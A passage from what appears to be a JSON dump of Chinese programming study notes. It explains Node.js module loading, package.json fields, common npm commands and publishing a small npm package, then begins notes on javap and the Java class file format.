123;\n//module.exports.age = 18;\n \n//通过module.exports也可以导出一个值，但是多次导出会覆盖\nmodule.exports = '123';\nmodule.exports = \"abc\"\n```\n\n**module.exports与exports**\n- exports 是 module.exports 的引用\n```js\nconsole.log( module.exports === exports ) // ==> true\n \n// 等价操作\nmodule.exports.num = 123\nexports.num = 123\n \n// 赋值操作：不要使用 exports = {}\nmodule.exports = {}\n```\n\n**引入一个模块的过程**\n- 先基于当前文件模块所属目录找 node_modules 目录\n- 如果找到，则去该目录中找 mime 目录\n- 如果找到 mime 目录，则找该目录中的 package.json 文件\n- 如果找到 package.json 文件，则找该文件中的 main 属性\n- 如果找到 main 属性，则拿到该属性对应的文件路径\n- 如果找到 mime 目录之后\n  - 发现没有 package.json\n  - 或者 有 package.json 没有 main 属性\n  - 或者 有 main 属性，但是指向的路径不存在\n  - 则 node 会默认去看一下 mime 目录中有没有 index.js index.node index.json 文件\n- 如果找不到 index 或者找不到 mime 或者找不到 node_modules\n- 则进入上一级目录找 node_moudles 查找规则同上\n- 如果上一级还找不到，继续向上，一直到当前文件所属磁盘根目录\n- 如果最后到磁盘根目录还找不到，最后报错：can not find module xxx\n\n**引入一个全局模块**\n想要在js文件中通过require（‘模块名’）来使用全局安装的模块，有三种方式，\n- 模块名使用路径\n- 配置Node系统环境变量\n- 使用`npm link`命令创建全局链接\n\n## 包(package)\nCommonJS的包规范允许我们将一组相关的模块组合到一起，形成一组完整的工具\nCommonJS的包规范有`包结构`和`包描述文件`两个部分组成\n- 包结构：用于组织包中的各种文件\n- 包描述文件：描述包的相关信息，以供外部读取分析\n\n**包结构**\n包实际上就是一个压缩文件，解压以后是一个目录。符合CommonJS规范的目录，应该包含如下文件/文件夹：\n- package.json：描述文件，**这是必须要有的文件**\n- bin：存放可执行二进制文件的文件夹\n- lib：存放js代码的文件夹\n- doc：存放文档的文件夹\n- test：存放单元测试的文件夹\n\nNode.js 对包的要求并没有这么严格，只要顶层目录下有 package.json，并符合一些规范即可。\n\n## package.json文件说明\n**包含可配置项**\n- name 名称\n- 应用描述 description\n- 版本号 version\n- 脚本 script\n- 应用的配置项 config\n- 作者 author\n- 资源仓库地址 respository\n- 授权方式 licenses\n- 目录 directories\n- 应用入口文件 main\n- 命令行文件 bin\n- 项目应用运行依赖模块 dependencies\n- 项目应用开发环境依赖 devDependencies\n- 运行引擎 engines\n- ...\n\n**scripts字段**\nscripts指定了运行脚本命令的npm命令行缩写，比如dev指定了运行`webpack-dev-server --inline --progress --config build/webpack.dev.conf.js`时，所要执行的命令。\n```json\n\"scripts\" : {\n  \"dev\" : \"webpack-dev-server --inline --progress --config build/webpack.dev.conf.js\"\n}\n```\n然后执行`npm run + scripts的key`,就相当于执行scripts的key对应的value，\n如：执行`npm run dev`等同于执行`webpack-dev-server --inline --progress --config build/webpack.dev.conf.js`， 即启动程序\n\n**dependencies**\n应用依赖，或者叫做业务依赖，这是我们最常用的依赖包管理对象！它用于指定应用依赖的外部包，这些依赖是应用发布后正常执行时所需要的，但不包含测试时或者本地打包时所使用的包。可使用下面的命令来安装：\n```shell\nnpm install packageName --save\n```\ndependencies是一个简单的JSON对象，包含包名与包版本，其中包版本可以是版本号或者URL地址。比如：\n```json\n{ \n  \"dependencies\" :{ \n    \"foo\" : \"1.0.0 - 2.9999.9999\", // 指定版本范围\n    \"bar\" : \">=1.0.2 <2.1.2\", \n    \"baz\" : \">1.0.2 <=2.3.4\", \n    \"boo\" : \"2.0.1\", // 指定版本\n    \"qux\" : \"<1.0.0 || >=2.3.1 <2.4.5 || >=2.5.2 <3.0.0\", \n    \"asd\" : \"http://asdf.com/asdf.tar.gz\", // 指定包地址\n    \"til\" : \"~1.2\",  // 最近可用版本\n    \"elf\" : \"~1.2.3\", \n    \"elf\" : \"^1.2.3\", // 兼容版本\n    \"two\" : \"2.x\", // 2.1、2.2、...、2.9皆可用\n    \"thr\" : \"*\",  // 任意版本\n    \"thr2\": \"\", // 任意版本\n    \"lat\" : \"latest\", // 当前最新\n    \"dyl\" : \"file:../dyl\", // 本地地址\n    \"xyz\" : \"git+ssh://git@github.com:npm/npm.git#v1.0.27\", // git 地址\n    \"fir\" : \"git+ssh://git@github.com:npm/npm#semver:^5.0\",\n    \"wdy\" : \"git+https://isaacs@github.com/npm/npm.git\",\n    \"xxy\" : \"git://github.com/npm/npm.git#v1.0.27\",\n  }\n}\n```\n指定版本：比如1.2.2，版本的命名一般都遵循`大(主)版本.次(子)版本.小版本`的格式规定，安装时只安装指定版本。\n- 波浪号（tilde）+指定版本：比如~1.2.2，表示安装1.2.x的最新版本（不低于1.2.2），但是不安装1.3.x，也就是说安装时不改变大版本号和次要版本号。\n- 插入号（caret）+指定版本：比如ˆ1.2.2，表示安装1.x.x的最新版本（不低于1.2.2），但是不安装2.x.x，也就是说安装时不改变大版本号。需要注意的是，如果大版本号为0，则插入号的行为与波浪号相同，这是因为此时处于开发阶段，即使是次要版本号变动，也可能带来程序的不兼容。\n\n**devDependencies**\n开发环境依赖，仅次于dependencies的使用频率！它的对象定义和dependencies一样，只不过它里面的包只用于开发环境，不用于生产环境，这些包通常是单元测试或者打包工具等，例如gulp, grunt, webpack, moca, coffee等，可使用以下命令来安装：\n```\nnpm install packageName --save-dev\n```\n举个栗子：\n```json\n{ \"name\": \"ethopia-waza\",\n  \"description\": \"a delightfully fruity coffee varietal\",\n  \"version\": \"1.2.3\",\n  \"devDependencies\": {\n    \"coffee-script\": \"~1.6.3\"\n  },\n  \"scripts\": {\n    \"prepare\": \"coffee -o lib/ -c src/waza.coffee\"\n  },\n  \"main\": \"lib/waza.js\"\n}\n```\n\n**peerDependencies**\n同等依赖，或者叫同伴依赖，用于指定当前包（也就是你写的包）兼容的宿主版本。如何理解呢？ 试想一下，我们编写一个gulp的插件，而gulp却有多个主版本，我们只想兼容最新的版本，此时就可以用同等依赖（peerDependencies）来指定：\n```json\n{\n  \"name\": \"gulp-my-plugin\",\n  \"version\": \"0.0.1\",\n  \"peerDependencies\": {\n    \"gulp\": \"3.x\"\n  }\n}\n```\n当别人使用我们的插件时，peerDependencies就会告诉明确告诉使用方，你需要安装该插件哪个宿主版本。\n通常情况下，我们会在一个项目里使用一个宿主（比如gulp）的很多插件，如果相互之间存在宿主不兼容，在执行npm install时，cli会抛出错误信息来告诉我们，比如：\n```\nnpm ERR! peerinvalid The package gulp does not satisfy its siblings' peerDependencies requirements!\nnpm ERR! peerinvalid Peer gulp-cli-config@0.1.3 wants gulp@~3.1.9\nnpm ERR! peerinvalid Peer gulp-cli-users@0.1.4 wants gulp@~2.3.0\n```\n运行命令`npm install gulp-my-plugin --save-dev`来安装我们插件，我们来看下依赖图谱：\n```\n├── gulp-my-plugin@0.0.1\n└── gulp@3.9.1\n```\n> 注意，npm 1 与 npm 2 会自动安装同等依赖，npm 3 不再自动安装，会产生警告！手动在package.json文件中添加依赖项可以解决。\n\n**optionalDependencies**\n可选依赖，如果有一些依赖包即使安装失败，项目仍然能够运行或者希望npm继续运行，就可以使用optionalDependencies中声明的依赖。另外optionalDependencies会覆盖dependencies中的同名依赖包，所以不要在两个地方都写。\n\n**bundledDependencies**\n打包依赖，bundledDependencies是一个包含依赖包名的数组对象，在发布时会将这个对象中的包打包到最终的发布包里。如：\n```json\n{\n  \"name\": \"fe-weekly\",\n  \"description\": \"ELSE 周刊\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\",\n  \"devDependencies\": {\n    \"fw2\": \"^0.3.2\",\n    \"grunt\": \"^1.0.1\",\n    \"webpack\": \"^3.6.0\"\n  },\n  \"dependencies\": {\n    \"gulp\": \"^3.9.1\",\n    \"hello-else\": \"^1.0.0\"\n  },\n  \"bundledDependencies\": [\n    \"fw2\",\n    \"hello-else\"\n  ]\n}\n```\n执行打包命令npm pack, 在生成的fe-weekly-1.0.0.tgz包中，将包含fw2和hello-else。 但是值得注意的是，这两个包必须先在devDependencies或dependencies声明过，否则打包会报错。\n\n**description**\n字符串。用来描述当前项目的大致功能。\n\n**name**\n此项目包的名称。在不确定自己的包名能否使用之前，请先npm registry 一下，看看当前你喜欢的包名是否已经被占用。\n\n**version**\n当前项目包的版本号。每一次项目改动时，在即将发布时，都要同步的去更改项目的版本号。一般格式为：x.y.z。意思是：大版本.中版本.小版本\n\n**keywords**\n放简介，字符串。方便屌丝们在 npm search中搜索\n\n**homepage**\n项目官网的url\n\n**bugs**\n你项目的提交问题的url和（或）邮件地址。这对遇到问题的屌丝很有帮助。\n```json\n{ \"url\" : \"http://github.com/owner/project/issues\" , \"email\" : \"project@hostname.com\" }\n```\n你可以指定一个或者指定两个。如果你只想提供一个url，那就不用对象了，字符串就行。如果提供了url，它会被npm bugs命令使用。\n\n**license**\n你应该要指定一个许可证，让人知道使用的权利和限制的。最简单的方法是，假如你用一个像BSD或者MIT这样通用的许可证，就只需要指定一个许可证的名字，像这样：\n```json\n{ \"license\" : \"BSD\" }\n```\n\n**author**\n项目作者。可以指定name，email，url字段信息。也可以单独使用字符串来表示。\n```json\n{“ author ”: { \"name\" : \"Barney Rubble\" , \"email\" : \"b@rubble.com\" , \"url\" : \"http://barnyrubble.tumblr.com/\" } }\n```\n\n**contributors**\n项目相关贡献者。是数组。用于罗列对应的贡献人。可以是单独的字符串，也可以分别指定name,email,url等属性。\n```json\n{\"contributors \":[ { \"name\" : \"Barney Rubble\" , \"email\" : \"b@rubble.com\" , \"url\" : \"http://barnyrubble.tumblr.com/\" } ]}\n```\n\n**files**\npackage.json中的files字段，这个字段中的文件默认会加入到npm publish发布的包中，它的优先级高于.npmignore和.gitignore，这个才是使用最广的方法，好像很多开源项目用的都是files字段\n\n`.npmignore`文件与`.gitignore`文件中的文件不会被发布,如果两个文件同时存在,`.npmignore`的优先级更好\n```json\n{ \"files\": [ \"bin/\", \"templates/\", \"test/\" ]}\n```\n\n**main**\nmain字段是一个模块ID，它是一个指向你程序的主要项目。就是说，如果你包的名字叫foo，然后用户安装它，然后require(\"foo\")，然后你的main模块的exports对象会被返回。这应该是一个相对于根目录的模块ID。对于大多数模块，它是非常有意义的，其他的都没啥。\n```json\n{ \"main\": \"bin/index.js\"}\n```\n\n**bin**\n很多包都有一个或多个可执行的文件希望被放到PATH中。（实际上，就是这个功能让npm可执行的）。要用这个功能，给package.json中的bin字段一个命令名到文件位置的map。初始化的时候npm会将他链接到prefix/bin（全局初始化）或者./node_modules/.bin/（本地初始化）。\n```json\n{ \"bin\" : { \"npm\" : \"./cli.js\" } }\n```\n当你初始化npm，它会创建一个符号链接到cli.js脚本到/usr/local/bin/npm。如果你只有一个可执行文件，并且名字和包名一样。那么你可以只用一个字符串，比如\n```json\n{ \"name\": \"my-program\" , \"version\": \"1.2.5\" , \"bin\": \"./path/to/program\" }\n// 等价于\n{ \"name\": \"my-program\" , \"version\": \"1.2.5\" , \"bin\" : { \"my-program\" : \"./path/to/program\" } }\n```\n\n**config字段**\nconfig字段用于向环境变量输出值。\n```json\n{\n  \"name\" : \"foo\",\n  \"config\" : { \"port\" : \"8080\" },\n  \"scripts\" : { \"start\" : \"node server.js\" }\n}\n```\n\n**man**\n指定一个单一的文件或者一个文件数组供man程序使用。如果只提供一个单一的文件，那么它初始化后就是man 的结果，而不管实际的文件名是神马，比如：\n```json\n{ \"name\" : \"foo\" , \"version\" : \"1.2.3\" , \"description\" : \"A packaged foo fooer for fooing foos\" , \"main\" : \"foo.js\" , \"man\" : \"./man/doc.1\" }\n```\n这样man foo就可以用到./man/doc.1文件了。\n如果文件名不是以包名开头，那么它会被冠以前缀，下面的：\n```json\n{ \"name\" : \"foo\" , \"version\" : \"1.2.3\" , \"description\" : \"A packaged foo fooer for fooing foos\" , \"main\" : \"foo.js\" , \"man\" : [ \"./man/foo.1\", \"./man/bar.1\" ] }\n```\n会为man foo和man foo-bar创建文件。\nman文件需要以数字结束，然后可选地压缩后以.gz为后缀。\n```json\n{ \"name\" : \"foo\" , \"version\" : \"1.2.3\" , \"description\" : \"A packaged foo fooer for fooing foos\" , \"main\" : \"foo.js\" , \"man\" : [ \"./man/foo.1\", \"./man/foo.2\" ] }\n```\n会为man foo和man 2 foo创建。\n\n**repository**\n指定你的代码存放的地方。这个对希望贡献的人有帮助。如果git仓库在github上，那么npm docs命令能找到你。\n\n**engines**\n指定项目工作的环境。除非用户设置engine-strict标记，这个字段只是建议值。\n```json\n{ \"engines\" : { \"node\" : \">=0.10.3 <0.12\", \"npm\" : \"~1.0.20\" } }\n```\n\n**engineStrict**\n如果你确定你的模块一定不会运行在你指定版本之外的node或者npm上，你可以在package.json文件中设置\"engineStrict\":true。它会重写用户的engine-strict设置。除非你非常非常确定，否则不要这样做。如果你的engines hash过度地限制，很可能轻易让自己陷入窘境。慎重地考虑这个选择。如果大家滥用它，它会再以后的npm版本中被删除。\n\n**os**\n可以指定你的模块要运行在哪些操作系统中\n```json\n\"os\" : [ \"darwin\", \"linux\" ]\n```\n你也可以用黑名单代替白名单，在名字前面加上“!”就可以了：\n```json\n\"os\" : [ \"!win32\" ]\n```\n操作系统用process.platform来探测。虽然没有很好地理由，但它是同时支持黑名单和白名单的。\n\n**cpu**\n如果你的代码只能运行在特定的cpu架构下，你可以指定一个\n```json\n\"cpu\" : [ \"x64\", \"ia32\" ]\n```\n就像os选项，你也可以黑一个架构：\n```sjon\n\"cpu\" : [ \"!arm\", \"!mips\" ]\n```\ncpu架构用process.arch探测。\n\n**style字段**\nstyle指定供浏览器使用时，样式文件所在的位置。样式文件打包工具parcelify，通过它知道样式文件的打包位置。\n```json\n\"style\": [\n  \"./node_modules/tipso/src/tipso.css\"\n]\n```\n\n**preferGlobal**\n如果包主要是需要全局安装的命令行程序，就设置它为true来提供一个warning给只在局部安装的人。它不会真正的防止用户在局部安装，但如果它没有按预期工作它会帮助防止产生误会。\n```json\n{\" preferGlobal \":true}\n```\n\n**private**\n如果你设置\"private\": true，npm就不会发布它。\n这是一个防止意外发布私有库的方式。如果你要确定给定的包是只发布在特定registry（如内部registry）的，用publishConfighash的描述来重写registry的publish-time配置参数。\n\n# node不支持import语法\nnode编程中最重要的思想之一就是模块，而正是这个思想，让JavaScript的大规模工程成为可能。模块化编程在js界流行，也是基于此，随后在浏览器端，requirejs和seajs之类的工具包也出现了，可以说在对应规范下，require统治了ES6之前的所有模块化编程，即使现在，在ES6 module被完全实现之前，还是这样。ES6标准发布后，module成为标准，标准的使用是以export指令导出接口，以import引入模块。但因为一些历史原因，虽然Node.js已经实现了99%的ES6新特性，采用的却是CommonJS规范，使用require引入模块，使用module.exports导出接口。\n\nnodejs采用的是CommonJS的模块化规范，使用require引入模块；而import是ES6的模块化规范关键字。想要使用import，必须引入babel转义支持，通过babel进行编译，使其变成node的模块化代码。\n\n**在node中使用import/export的方法：**\n想要使用import，必须引入babel转义支持，通过babel进行编译，使其变成node的模块化代码。\n我们可以在命令行中使用 babel-node 命令来进行编译，babel-node 命令不是独立安装，在 Babel 7.X 版本前，需要通过安装 babel-cli 包获得；\n安装必要的插件\n```\n# 全局安装 babel-cli\nnpm install babel-cli -g\n\n# 安装 babel-preset-env\nnpm install babel-preset-env -D\n```\n然后原来是`node server.js`, 改为这样调用`babel-node --presets env server.js`\n\n# npm常见命令\n**npm init**\nnpm init 用来初始化生成一个新的 package.json 文件。它会向用户提问一系列问题，如果你觉得不用修改默认配置，一路回车就可以了。\n如果使用了 -f（代表force）、-y（代表yes），则跳过提问阶段，直接生成一个新的 package.json 文件。\n```shell\n$ npm init -y\n```\n\n**npm set**\nnpm set 用来设置环境变量\n```shell\n$ npm set init-author-name 'Your name'\n$ npm set init-author-email 'Your email'\n$ npm set init-author-url 'http://yourdomain.com'\n$ npm set init-license 'MIT'\n```\n上面命令等于为 npm init 设置了默认值，以后执行 npm init 的时候，package.json 的作者姓名、邮件、主页、许可证字段就会自动写入预设的值。这些信息会存放在用户主目录的 ~/.npmrc文件，使得用户不用每个项目都输入。如果某个项目有不同的设置，可以针对该项目运行 npm config。\n\n**npm info**\nnpm info 命令可以查看每个模块的具体信息。比如，查看 underscore 模块的信息。\n```shell\n$ npm info underscore\n```\n上面命令返回一个 JavaScript 对象，包含了 underscore 模块的详细信息。这个对象的每个成员，都可以直接从 info 命令查询。\n```shell\n$ npm info underscore description\n$ npm info underscore homepage\n$ npm info underscore version\n```\n\n**npm search**\nnpm search 命令用于搜索 npm 仓库，它后面可以跟字符串，也可以跟正则表达式。\n```shell\n$ npm search <搜索词>\n```\n\n**npm list**\nnpm list 命令以树形结构列出当前项目安装的所有模块，以及它们依赖的模块。\n```shell\n$ npm list\n\n#  查看[全局]安装的包\nnpm list --depth=0 [-g] \n\n# npm list 命令也可以列出单个模块\n$ npm list underscore\n```\n\n**npm root**\n```shell\n# 查看[全局的]包的安装路径\nnpm root [-g] \n```\n\n**安装不同版本**\ninstall 命令总是安装模块的最新版本，如果要安装模块的特定版本，可以在模块名后面加上 @ 和版本号。\n```shell\n$ npm install sax@latest\n$ npm install sax@0.1.1\n$ npm install sax@\">=0.1.0 <0.2.0\"\n```\ninstall 命令可以使用不同参数，指定所安装的模块属于哪一种性质的依赖关系，即出现在 packages.json 文件的哪一项中。\n\n**npm run**\nnpm 不仅可以用于模块管理，还可以用于执行脚本。package.json 文件有一个 scripts 字段，可以用于指定脚本命令，供 npm 直接调用。\n- `npm run`如果不加任何参数，直接运行，会列出 package.json 里面所有可以执行的脚本命令。\n- npm 内置了两个命令简写，`npm test`等同于执行`npm run test`，`npm start`等同于执行`npm run start`\n\n**pre- 和 post- 脚本**\n`npm run`为每条命令提供了`pre-`和`post-`两个钩子（hook）。以`npm run lint`为例，执行这条命令之前，npm 会先查看有没有定义`prelint`和`postlint`两个钩子，如果有的话，就会先执行`npm run prelint`,然后执行`npm run lint`,最后执行`npm run postlint`.\n```json\n{\n  \"name\": \"myproject\",\n  \"devDependencies\": {\n    \"eslint\": \"latest\"\n    \"karma\": \"latest\"\n  },\n  \"scripts\": {\n    \"lint\": \"eslint --cache --ext .js --ext .jsx src\",\n    \"test\": \"karma start --log-leve=error karma.config.js --single-run=true\",\n    \"pretest\": \"npm run lint\",\n    \"posttest\": \"echo 'Finished running tests'\"\n  }\n}\n```\n上面代码是一个 package.json 文件的例子。如果执行`npm test`,会按pretest->test->posttest下面的顺序执行相应的命令。\n如果执行过程出错，就不会执行排在后面的脚本，即如果 prelint 脚本执行出错，就不会接着执行 lint 和 postlint 脚本。\n\n**npm bin**\nnpm bin 命令显示相对于当前目录的，Node 模块的可执行脚本所在的目录（即 .bin 目录）。\n```shell\n# 项目根目录下执行\n$ npm bin\n./node_modules/.bin\n```\n\n**创建全局链接**\nnpm 提供了一个有趣的命令 npm link，它的功能是在本地包和全局包之间创建符号链接。我们说过使用全局模式安装的包不能直接通过 require 使用。但通过 npm link 命令可以打破这一限制。举个例子，我们已经通过`npm install -g express`安装了`express`，这时在工程的目录下运行命令：\n```shell\nnpm link express ./node_modules/express -> /user/local/lib/node_modules/express\n```\n我们可以在 node_modules 子目录中发现一个指向安装到全局的包的符号链接。通过这种方法，我们就可以把全局包当做本地包来使用了。\n除了将全局的包链接到本地以外，使用 npm link 命令还可以将本地的包链接到全局。使用方法是在包目录（package.json 所在目录）中运行 npm link 命令。如果我们要开发一个包，利用这种方法可以非常方便地在不同的工程间进行测试。\n\n**包的发布, npm adduser, npm whoami, npm publish, npm unpublish**\n通过使用 npm init 可以根据交互式回答产生一个符合标准的 package.json。创建一个 index.js 作为包的接口,一个简单的包就制作完成了。\n在发布前,我们还需要获得一个账号用于今后维护自己的包,使用`npm adduser`根据提示完成账号的创建。\n完成后可以使用`npm whoami`检测是否已经取得了账号。\n接下来，在 package.json 所在目录下运行`npm publish`,稍等片刻就可以完成发布了，打开浏览器，访问 http://search.npmjs.org/ 就可以找到自己刚刚发布的包了。现在我们可以在世界的任意一台计算机上使用`npm install neveryumodule`命令来安装它。\n\n如果你的包将来有更新,只需要在 package.json 文件中修改 version 字段，然后重新使用`npm publish`命令就行了。\n如果你对已发布的包不满意，可以使用`npm unpublish`命令来取消发布。\n\n# 编写和发布NPM软件包\n首先要登陆npm官网，创建一个npm账号\n\n## 本地创建js模块\n然后在本地创建一个需要打包成npm软件的js模块：\n\n```shell\nmkdir shadowizard && cd shadowizard\n```\n\n在该文件夹下创建如下index.js与README.md2个文件：\n\nindex.js:\n\n```js\nfunction shadowizard(options) {\n  let images = document.querySelectorAll('.shadowizard');\n\n  if (options.shadow_type === 'hard') {\n    options.shadow_type = 'opx';\n  } else {\n    options.shadow_type = '15px';\n  }\n\n  images.forEach(image => {\n    image.style.boxShadow = `10px 10px ${options.shadow_type} 1px rgba(0, 0, 0, 0.12)`;\n\n    if (options.padding) {\n      image.style.padding = \"1em\";\n    }\n  })\n}\n\nmodule.exports.shadowizard = shadowizard\n```\n\nREADME.md:\n\n```md\n# What is this?\n\nGet prefect shadows every time for the non-designer.\n\n# Installation\n\n`npm i shadowizard --save`\n\nThen ...\n\n``\nimport {shadowizard} from 'shadowizard';\n\nshadowizard({\n  shadow_type: 'soft',\n  padding: false\n})\n``\n\n## Options\n\nShadowizard supports 2 options, both of which are optional:\n\n* *shadow_type* - _hard | soft_ (Defaults to soft)\n* *padding* - _boolean_ (Defaults to false)\n\n```\n\n然后创建一个github远程仓库，将该文件夹同步到github上\n\n```bash\ngit init\ngit add .\ngit commit -m \"first commit\"\ngit remote add origin git@github.com:NaisWang/shadowizard.git\ngit push -u origin master\n```\n\n## 发布到npm\n\n需要使用`npm init`来初始化js模块文件夹\n\n```bash\nnpm init\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106135422.png)\n\n然后使用`npm publish`来发布该js模块到npm上，注意，在发布前，需要使用`npm login`来登陆用户，否则会报错，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106120008.png)\n\n登陆用户\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106140322.png)\n\n可以使用`npm whoami`命令来查看当前登陆用户：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106140418.png)\n\n\n然后发布即可\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106135646.png)\n\n\n你随后在npm官网就可以看到这个包了\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106135709.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106135748.png)\n\n## 使用刚刚上传的npm包\n使用`npm i @hzwang/shadowizard --save`来下载\n\n下载到目录如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220106140103.png)\n"
  },
  {
    "title": "./notes/基础知识/jvm.md",
    "body": "# JDK体系结构\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131332.png)\n\n# JVM整体架构\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131351.png)\n\n## java中的编译器和解释器\nJava中引入了虚拟机的概念，即在机器和编译程序之间加入了一层抽象的虚拟机器。这台虚拟的机器在任何平台上都提供给编译程序一个的共同的接口。编译程序只需要面向虚拟机，生成虚拟机能够理解的代码，然后由解释器来将虚拟机代码转换为特定系统的机器码执行。在Java中，这种供虚拟机理解的代码叫做字节码（即扩展为.class的文件），它不面向任何特定的处理器，只面向虚拟机。每一种平台的解释器是不同的，但是实现的虚拟机是相同的。Java源程序经过编译器编译后变成字节码，字节码由虚拟机解释执行，虚拟机将每一条要执行的字节码送给解释器，解释器将其翻译成特定机器上的机器码，然后在特定的机器上运行，这就是上面提到的Java的特点的编译与解释并存的解释。\n\n**流程：**\njava源代码 --> 编译器 --> jvm可执行的java字节码(即虚拟指令) --> jvm --> jvm中解释器 --> 机器码\n\n# 编译期\n通过javac命名将java文件编译成.class文件\n\n# javap命令\njavap是jdk自带的反解析工具。它的作用就是根据class字节码文件，反解析出当前类对应的code区（汇编指令）、本地变量表、异常表和代码行偏移量映射表、常量池等等信息。\n当然这些信息中，有些信息（如本地变量表、指令和代码行偏移量映射表、常量池中方法的参数名称等等）需要在使用javac编译成class文件时，指定参数才能输出，比如，你直接javac xx.java，就不会在生成对应的局部变量表等信息，如果你使用`javac -g xx.java`就可以生成所有相关信息了。如果你使用的eclipse，则默认情况下，eclipse在编译时会帮你生成局部变量表、指令和代码行偏移量映射表等信息的。\n通过反编译生成的汇编代码，我们可以深入的了解java代码的工作机制。比如我们可以查看i++；这行代码实际运行时是先获取变量i的值，然后将这个值加1，最后再将加1后的值赋值给变量i。\n通过局部变量表，我们可以查看局部变量的作用域范围、所在槽位等信息，甚至可以看到槽位复用等信息。\n\njavap的用法格式：\n```\njavap <options> <classes>\n```\n其中classes就是你要反编译的class文件。\n在命令行中直接输入javap或javap -help可以看到javap的options有如下选项：\n```\n -help  --help  -?        输出此用法消息\n -version                 版本信息，其实是当前javap所在jdk的版本信息，不是class在哪个jdk下生成的。\n -v  -verbose             输出附加信息（包括行号、本地变量表，反汇编等详细信息）\n -l                         输出行号和本地变量表\n -public                    仅显示公共类和成员\n -protected               显示受保护的/公共类和成员\n -package                 显示程序包/受保护的/公共类 和成员 (默认)\n -p  -private             显示所有类和成员\n -c                       对代码进行反汇编\n -s                       输出内部类型签名\n -sysinfo                 显示正在处理的类的系统信息 (路径, 大小, 日期, MD5 散列)\n -constants               显示静态最终常量\n -classpath <path>        指定查找用户类文件的位置\n -bootclasspath <path>    覆盖引导类文件的位置\n ```\n一般常用的是-v -l -c三个选项。\n`javap -v classxx`，不仅会输出行号、本地变量表信息、反编译汇编代码，还会输出当前类用到的常量池等信息。\n`javap -l`会输出行号和本地变量表信息。\n`javap -c`会对当前class字节码进行反编译生成汇编代码。\n\n# Class类文件结构\nClass文件是一组以8位字节为基础单位的二进制流，各个数据项目严格按照顺序紧凑地排列在Class文件中，中间没有添加任何分隔符，这使得整个Class文件中存储的内容几乎全部都是程序运行的必要数据。根据Java虚拟机规范的规定，Class文件格式采用一种类似于C语言结构体的伪结构来存储，这种伪结构中**只有两种数据类型：无符号数和表**。无符号数属于基本数据类型，以u1、u2、u4、u8来分别代表1、2、4、8个字节的无符号数。表是由多个无符号数或其他表作为数据项构成的符合数据类型，所有的表都习惯性地以`_info`结尾。\n下表列出了Class文件中各个数据项的具体含义：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131430.png)\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131444.png)\n从表中可以看出，无论是无符号数还是表，当需要描述同一类型但数量不定的多个数据时，经常会在其前面使用一个前置的容量计数器来记录其数量，而便跟着若干个连续的数据项，称这一系列连续的某一类型的数据为某一类型的集合，如：`fields_count`个`field_info`表数据便组成了方法表集合\n\n这里需要注意的是：Class的结构不像XML等描述语言，由于它没有任何分隔符号，所以上表的数据项，无论是顺序还是数量，甚至于数据存储的字节序这样的细节，都是被严格限定的，每个字节代表的含义、长度、先后顺序都不允许改变。\n\n## magic与version\n每个Class文件的头4个字节称为魔数（magic），它的唯一作用是判断该文件是否为一个能被虚拟机接受的Class文件。它的值固定为0xCAFEBABE。紧接着magic的4个字节存储的是Class文件的次版本号(Minor Version)和主版本号(Major Version)，高版本的JDK能向下兼容低版本的Class文件，但不能运行更高版本的Class文件。\n\n## `constant_pool`\n`major_version`之后是常量池（`constant_pool`）的入口，它是Class文件中与其他项目关联最多的数据类型，也是占用Class文件空间最大的数据项目之一。\n\n<font color=\"red\">常量池中主要存放两大类常量：字面量和符号引用。</font>字面量比较接近于Java层面的常量概念，如文本字符串、被声明为final的常量值等。而符号引用总结起来则包括了下面三类常量：\n- 类和接口的全限定名（即带有包名的Class名，如：org.lxh.test.TestClass）\n- 字段的名称和描述符（private、static等描述符）\n- 方法的名称和描述符（private、static等描述符）\n\n虚拟机在加载Class文件时才会进行动态连接，也就是说，Class文件中不会保存各个方法和字段的最终内存布局信息，因此，这些字段和方法的符号引用不经过转换是无法直接被虚拟机使用的。当虚拟机运行时，需要从常量池中获得对应的符号引用，再在类加载过程中的解析阶段将其替换为直接引用，并翻译到具体的内存地址中。\n\n这里说明下符号引用和直接引用的区别与关联：\n- **<font color=\"red\">符号引用</font>**：符号引用以一组符号来描述所引用的目标，符号可以是任何形式的字面量，只要使用时能无歧义地定位到目标即可, 比如java/lang/StringBuilder。符号引用与虚拟机实现的内存布局无关，引用的目标并不一定已经加载到了内存中。\n- **<font color=\"red\">直接引用</font>**：直接引用可以是直接指向目标的指针、相对偏移量或是一个能间接定位到目标的句柄， 比如指向内存里的java/lang/StringBuilder实例对象的指针。直接引用是与虚拟机实现的内存布局相关的，同一个符号引用在不同虚拟机实例上翻译出来的直接引用一般不会相同。如果有了直接引用，那说明引用的目标必定已经存在于内存之中了。\n\n常量池中的每一项常量都是一个表，在jdk1.7之前共有11种结构各不相同的表结构数据，在jdk1.7中为了更好地支持动态语言调用，又额外增加了3种(CONSTANT_MethodHandle_info, CONSTANT_MethodType_info, CONSTANT_InvokeDynamic_info), 